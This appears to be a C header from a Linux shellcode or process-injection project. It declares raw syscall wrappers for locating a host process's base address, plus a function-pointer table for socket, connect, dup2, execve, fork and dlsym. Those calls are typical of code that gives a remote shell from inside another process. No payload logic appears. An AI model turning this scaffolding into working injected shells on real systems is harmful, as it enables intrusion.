/**
  Copyright © 2019 Odzhan. All Rights Reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are
  met:

  1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.

  3. The name of the author may not be used to endorse or promote products
  derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE. */

#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>

#include <signal.h>
#include <sys/epoll.h>
#include <errno.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <dirent.h>
#include <glob.h>

#include <link.h>
#include <elf.h>
#include <fcntl.h>
#include <dlfcn.h>
#include <sys/mman.h>

// system calls required to query base address of host process
long _open(const char *, unsigned long, long);
int _read(long, char *, unsigned long);
int _close(unsigned int);
void *_mmap(void *, unsigned long, unsigned long, unsigned long,  long, unsigned long);
int _munmap(void *, size_t);
int _fstat(long, void *);
long _write(long fd, char *buf, unsigned long len);

typedef pid_t (*fork_t)(void);
typedef int (*dup2_t)(int oldfd, int newfd);
typedef int (*execve_t)(const char *filename, char *const argv[], char *const envp[]);
typedef int (*pipe_t)(int pipefd[2]);
typedef int (*open_t)(const char *pathname, int flags);
typedef ssize_t (*write_t)(int fd, const void *buf, size_t count);
typedef ssize_t (*read_t)(int fd, void *buf, size_t count);
typedef int (*close_t)(int fd);
typedef void *(*malloc_t)(size_t size);
typedef void (*free_t)(void *ptr);
typedef int (*kill_t)(pid_t pid, int sig);

typedef int (*globfunc_t)(const char *pattern, int flags, int (*errfunc) (const char *epath, int eerrno), glob_t *pglob);
typedef void (*globfree_t)(glob_t *pglob);

typedef int (*dlinfo_t)(void *handle, int request, void *info);
typedef void *(*dlopen_t)(const char *filename, int flag);
typedef void *(*dlsym_t)(void *handle, const char *symbol);

typedef int (*connect_t)(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
typedef int (*socket_t)(int domain, int type, int protocol);
typedef in_addr_t (*inet_addr_t)(const char *cp);
typedef uint16_t (*htons_t)(uint16_t hostshort);
typedef ssize_t (*send_t)(int sockfd, const void *buf, size_t len, int flags);
typedef ssize_t (*recv_t)(int sockfd, void *buf, size_t len, int flags);
typedef int (*shutdown_t)(int socket, int how);

typedef int (*epoll_create1_t)(int flags);
typedef int (*epoll_ctl_t)(int epfd, int op, int fd, struct epoll_event *event);
typedef int (*epoll_wait_t)(int epfd, struct epoll_event *events, int maxevents, int timeout);

typedef struct _data_t {
    int s;                  // socket file descriptor

    union {
      uint64_t hash[64];
      void     *addr[64];
      struct {
        // gnu c library functions
        pipe_t          _pipe;
        fork_t          _fork;
        socket_t        _socket;
        inet_addr_t     _inet_addr;
        htons_t         _htons;
        connect_t       _connect;
        dup2_t          _dup2;
        close_t         _close;
        execve_t        _execve;
        epoll_create1_t _epoll_create1;
        epoll_ctl_t     _epoll_ctl;
        epoll_wait_t    _epoll_wait;
        open_t          _open;
        write_t         _write;
        read_t          _read;
        shutdown_t      _shutdown;
        kill_t          _kill;
        send_t          _send;
        recv_t          _recv;
        globfunc_t      _glob;
        globfree_t      _globfree;
        malloc_t        _malloc;
        free_t          _free;
 
        // gnu dynamic linker functions
        dlsym_t         _dlsym;
        dlopen_t        _dlopen;
        dlinfo_t        _dlinfo;
      };
    } api;
} data_t;
 


void init_api(data_t *ds);
